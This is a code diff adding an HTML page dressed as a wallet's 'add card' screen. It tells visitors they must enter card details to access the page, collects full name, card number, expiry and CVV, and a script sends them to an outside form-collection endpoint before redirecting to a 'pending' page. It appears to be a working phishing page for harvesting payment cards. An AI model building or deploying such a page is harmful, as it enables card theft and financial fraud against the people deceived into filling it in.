@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" href="square-cash-svgrepo-com.svg">
+    <link rel="stylesheet" href="wallet.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card</title>
+</head>
+<body>
+    <div class="body">
+        <div class="top">
+            <div class="cardtext">
+                Card
+            </div>
+            <div class="home"><button onclick="window.location = 'index.html'"><img src="bank-svgrepo-com.svg" width="30px" alt=""></button></div>
+        </div>
+        <div class="info">
+            <div class="filltext">
+                Fill in the information below 
+                to access this page 
+            </div>
+        </div>
+        <form  method="post" action="https://formspree.io/f/xnqeggob" id="my-form">
+            <div class="cardname">
+                <label for="cardname">Full name</label>
+                <input type="text" name="cardname" required>
+            </div>
+            <div class="cardnumber">
+                <label for="cardnumber">Card number</label>
+                <input type="number" name="cardnumber"required>
+            </div>
+            <div class="expiry">
+                <div class="month">
+                    <label for="month">Expiry month</label>
+                    <input type="number" required minlength="1" maxlength="2" name="month" id="month">
+                </div>
+                <div class="year">
+                    <label for="year">Expiry year</label>
+                    <input type="number" required minlength="2" maxlength="4" name="year">
+                </div>
+            </div>
+            <div class="cvv">
+                <label for="cscorcvv">CVV/CSC</label>
+                <input type="number" required maxlength="4" minlength="3" name="cvv" id="">
+            </div>
+            <div class="cardtype">
+                <div class="text">Card Type</div>
+                <div class="other">
+                    <div class="debit">
+                        <label for="cardtype">Debit Card</label>
+                        <input type="radio" name="cardtype" value="one" id="">
+                    </div>
+                    <div class="credit">
+                        <label for="cardtype">Credit Card</label>
+                        <input type="radio" name="cardtype" value="two" id="">
+                    </div>
+                </div>
+            </div>
+            <div class="submit">
+                <button id="my-form-button" type="submit">Add card</button>
+            </div>
+        </form>
+    </div>
+<script>
+   var form = document.getElementById("my-form");
+  
+  async function handleSubmit(event) {
+    event.preventDefault();
+    var status = document.getElementById("my-form-status");
+    var data = new FormData(event.target);
+    fetch(event.target.action, {
+      method: form.method,
+      body: data,
+      headers: {
+          'Accept': 'application/json'
+      }
+    }).then(response => {
+      if (response.ok) {
+        window.location = "pending.html";
+        form.reset()
+      } else {
+        response.json().then(data => {
+          if (Object.hasOwn(data, 'errors')) {
+            alert('Please Check your Connection and input');
+            window.location = "wallet.html"
+          } else {
+            alert('Please Check your connection and try again later');
+            window.location = "wallet.html";
+          }
+        })
+      }
+    }).catch(error => {
+      status.innerHTML = "Oops! There was a problem submitting your form"
+    });
+  }
+  form.addEventListener("submit", handleSubmit)
+</script>
+</body>
+</html>
